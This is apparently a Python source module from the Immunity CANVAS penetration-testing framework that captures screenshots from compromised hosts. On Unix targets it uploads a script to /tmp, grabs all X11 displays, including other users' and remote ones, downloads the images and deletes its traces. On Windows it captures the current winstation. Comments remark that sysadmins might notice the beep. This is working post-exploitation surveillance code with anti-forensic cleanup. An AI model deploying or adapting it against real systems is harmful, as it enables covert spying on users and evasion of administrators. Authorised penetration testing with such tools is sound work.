#! /usr/bin/env python

#we need to display a nice little mini icon of the screen in the CANVAS gui! (kinda
#like VMware does...) PyGTK has support for raw data like this, if we want to use
#their routines

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *
from internal import *

from canvasexploit import canvasexploit
import canvasengine
import time
from libs.bmp import *
import random
from canvaserror import *

NAME="screengrab"
DESCRIPTION="Grab a picture of the screen"
DOCUMENTATION={}
DOCUMENTATION["Notes"]="""
For all selected nodes will take a screenshot of that node. On Windows, it takes a snapshot of the current winstation only. On Unix systems, it will attempt to enumerate all X11 displays, and take screenshots of them, optionally including remote displays being used by clients from the target system. Note that displays which are accessible via both unix and TCP sockets will result in two screenshots of the same system. On some X11 systems (e.g. Solaris), taking a screenshot causes the system to beep. Twitchy sysadmins might notice. If ImageMagick is installed on the Canvas host, screenshots will be available as .bmp files. Otherwise, they will be in .xwd format, which is readable in most graphics programs, but not by CANVAS's Screenshot viewer.
Using All Users and TCP Xservers options together can take a long time on a box that is used for X a lot (worst case: number-of-users * number-of-x-servers-ever * 3-second-timeout)

For commandline use:
MOSDEF\Win32> runmodule screengrab 
"""

VERSION="1.0"
affectsList=["Commands"]


from engine.config import canvas_root_directory
X11SCREENSHOT=os.path.join(canvas_root_directory, "Resources", "x11screengrab.sh")
import tarfile

def extractTar(tf, destpath):
    """Extracts all members of a tarfile. .extractall() was added in 2.5, we have to support 2.4"""
    if isinstance(tf, tarfile.TarFile):
        if hasattr(tf, "extractall"):
            tf.extractall(destpath)
        else:
            for f in tf.getmembers():
                if f.isdir():
                    print "Mkdiring: %s" % f.name
                    os.mkdirs(os.path.join(destpath, f.name), 0700)
                else:
                    print "Extracting %s/%s" % (destpath, f.name)
                    tf.extract(f, destpath)
    else:
        raise TypeError("Please to be passing in a TarFile instance")

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result=[]
        self.name=NAME
        self.filename=None
        self.vert=None
        self.hor=None
        return

    # set progress bar
    def set_progr(self, msg, percent):
        self.setInfo("screengrab - "+msg)
        self.setProgress(percent)
        return
    
    def run(self):
        rv = 0
        self.host=self.target.interface
        self.setInfo("%s (in progress)"%(NAME))
        dirname="My_Screenshots"
        #check to make sure directory exists
        try:
            hostlist=os.listdir(dirname)
        except:
            self.log("Could not find %s so creating it"%dirname)
            os.mkdir(dirname)

        screenshotCount = 0

        for node in self.argsDict["passednodes"]:                        
            type=node.nodetype
            if "win32api" in node.capabilities:
                #I'm assuming this opens the file read-write
                #on windows you need to have writable access
                #Lesson Learned: don't use os.tmpfile() for anything portable.
                #tempoutfile=os.tmpfile()
                tmpfilename="tmp%d.raw"%random.randint(0,50000)
                devlog("bmp", "tmpfilename=%s"%tmpfilename)
                tempoutfile=file(tmpfilename,"wb")
                hor,vert,data=node.shell.screengrab(fileobj=tempoutfile, progr=self.set_progr)
                tempoutfile.close() #go back to beginning
                tempoutfile=file(tmpfilename,"rb")
                ran=random.randint(1,2000)
                #filename="screengrab-%s.raw"%ran
                #fullfilename=os.path.join(canvas_root_directory,dirname,filename)
                #rgbfile=file(fullfilename, "wrb")
                bmpdata="" #set to null because we write into this file later
                filebmp ="screengrab-%s.bmp"%ran
                devlog("bmp", "filebmp = %s"%filebmp)
                fullbmp=os.path.join(canvas_root_directory,dirname,filebmp)
                fout = file(fullbmp, "wb")
                b = BMP()
                fout.write( b.getBMPfromraw(hor, vert, bmpdata) )
                devlog("bmp", "Calling normalize: %s:%s"%(hor,vert))
                normalize_no_change(hor, vert, tempoutfile, fout)
                #normalizergb_file(hor, vert, tempoutfile, fout)
                tempoutfile.close() #close this to flush it
                os.unlink(tmpfilename) #remove our temporary file
                fout.close()
                #now our rgbfile has the correct data in it
                #and is a BMP

                self.addScreenshot(node, fullbmp, vert, hor)
                screenshotCount+=1
                rv = 1
                msg = "success %d screen(s) shot" % screenshotCount

            elif "Unix Shell" in node.capabilities:
                destpath="/tmp" # TODO: somewhere more sensible?
                # upload shellscript which does the screenshotting
                try:
                    node.upload(X11SCREENSHOT, destpath, destpath+"/x.sh")
    
                        
                    self.setProgress(20)
                    args = []
                    if self.argsDict.get("tcpxservers") == False:
                        args.append("-t")
                    if self.argsDict.get("environment") == False:
                        args.append("-e")
                    if self.argsDict.get("allusers") == False:
                        args.append("-a")
    
                    output = node.runcommand("/bin/sh " + destpath +"/x.sh" +" " + " ".join(args))
                    self.setProgress(40)
                    self.log("X11 Screenshot: " + output)
                    
                    if output.find("No screenshots were successfully acquired") != -1:
                        raise ValueError("Remote end was unable to acquire any screenshots")

                    # Read output of script, spot it finishing, grab it's file.
                    l = output[output.index("File ready for transit: "):].split("\n")[0]
                    fn = l[l.index(":")+1:].strip()
                    lfn = "canvasXWD-tmp-%d" % random.randint(0,50000)
                    lfnDir = "%s-unpack.tar" % lfn
                    self.log("Attempting download of %s" % fn)
                    df = node.download(fn, lfn)
                    lfn = df.split(" ")[-1]
                    self.log("Saved screenshots into %s" % lfn)

                    self.setProgress(60)
                    # Clean up remote end
                    l = output[output.index("Remember to vape:"):].split("\n")[0]
                    fn = l[l.index(":"):].strip()
                    self.log("Cleaning up remote end")
                    node.runcommand("rm -rf %s %s/%s" % (fn, destpath,"x.sh"))
                    self.setProgress(80)
                    self.log("Unpacking and processing %s" % lfn)
                    # Unpack tarball
                    os.mkdir(lfnDir)
                    import tarfile
                    tf = tarfile.open(lfn, "r:gz")
                    extractTar(tf, lfnDir)
                    tf.close()
                    # Move into screenshot directory
                    w = 0
                    h = 0
                    import glob
                    prefix = "screengrab-%d-" % random.randint(1,2000)
                    for f in glob.glob(os.path.join(lfnDir, "dpy-*.xwd")):
                        # TODO: should turn them into BMPs with image magick or something.
                        imerror = None 
                        try:
                            import subprocess
                            dest = ".".join(os.path.split(f)[-1].split(".")[:-1]) + ".bmp"
                            dest = os.path.join(canvas_root_directory,dirname, prefix+dest)
                            self.log("Calling ImageMagick convert '%s' '%s'" % (f, dest))
                            # May as well call identify to get res while we're here huh
                            # I'm sure it can go into libs/bmp.py when someone writes
                            # an xwd -> bmp erator too.
                            convert = subprocess.Popen(["convert", f, dest])
                            if convert.wait() == 0:
                                ident = subprocess.Popen(["identify", dest], stdout=subprocess.PIPE)
                                if ident.wait() == 0:
                                    info = ident.stdout.read()
                                    w,h = info.split(" ")[2].split("x")
                                    h = int(h)
                                    w = int(w)
                                else:
                                    imerror = "identify failed to read converted bmp"
                            else:
                                imerror = "convert failed"
                        except OSError, info:
                            imerror = "Failed to popen: %s" % info

                        except ImportError, info:
                            imerror = "failed to import subprocess: %s" % info

                        if imerror != None:
                            self.log("Oh dear, no ImageMagick available, your screenshots will stay in xwd format (%s)" % imerror)
                            dest = os.path.join(canvas_root_directory,dirname, prefix+os.path.split(f)[-1])
                            os.rename(f,dest)

                        self.log("Adding screenshot %s as %s" % (f, dest))
                        screenshotCount += 1
                        self.addScreenshot(node, dest, w, h)

                        rv = 1
                    msg = "success %d screen(s) shot" % screenshotCount
                    
                    # TODO: Stash the xauth files somewhere too?
                    
                    #Clean up
                    self.log("Cleaning up local end")
                    for root, dirs, files in os.walk(lfnDir, topdown=False):
                        for name in files:
                            os.remove(os.path.join(root, name))
                        for name in dirs:
                            os.rmdir(os.path.join(root, name))
                    os.rmdir(lfnDir)
                    os.unlink(lfn)
                    self.setProgress(100)


                except (ValueError, NodeCommandError), info:
                    self.log("X11 screengrab on %s didn't work: %s" % (node.get_interesting_interface(), info))
                    self.setProgress(-1)
                    rv = -1
                    msg = "failed"

            else:
                self.log("Node of type %s not supported yet."%type)
                rv = -1
                msg = "unsupported"
            
        self.setInfo("%s - done (%s)"%(NAME, msg))
        return rv
    
    def addScreenshot(self, node, filename, height, width):
        """Adds a screenshot to the Gui's screenshot store"""
        self.log("Check \"My Screenshots\" icon to see the screenshot")
        localhost=node.get_known_host("127.0.0.1") #get local host
        localhost.add_knowledge("Screengrab",":".join(["%s"%height,"%s"%width,filename]),100)
        filename = ".".join(filename.split(".")[:-1]) + ".conf"
        fout=file(filename, "wb")
        
        # TODO: Fix this to use exploits/computername, cause node.shell is not right way
        computername= "hostnamegoeshere"
        try:
            computername= node.shell.getComputerName()
        except AttributeError:
            pass

        host=node.get_interesting_interface()

        fout.write("%d:%d:%s [%s]" % (height, width, computername, host))
        fout.close()

        self.result+=[(width, height, filename)]
        

if __name__=="__main__":
    print "You can't run this from the commandline, sorry"
